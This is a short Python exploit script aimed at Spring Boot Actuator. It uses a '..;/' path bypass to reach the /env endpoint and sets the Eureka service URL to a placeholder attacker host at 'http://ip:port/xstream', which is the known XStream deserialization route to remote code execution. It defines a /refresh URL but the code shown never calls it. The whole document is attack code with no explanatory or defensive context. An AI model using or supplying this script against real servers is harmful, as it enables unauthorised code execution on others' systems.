import requests
import time

url = "http://127.0.0.1:9090/..;/env"
url2 = "http://127.0.0.1:9090/..;/refresh"

header = {"Host":"127.0.0.1:9090",
		  "Content-Type": "application/x-www-form-urlencoded",
		  "Cache-Control": "max-age=0",
		  "Content-Length":"74"}

body = "eureka.client.serviceUrl.defaultZone=http://ip:port/xstream"

re = requests.post(url=url,headers=header,data=body)
print(re.text)


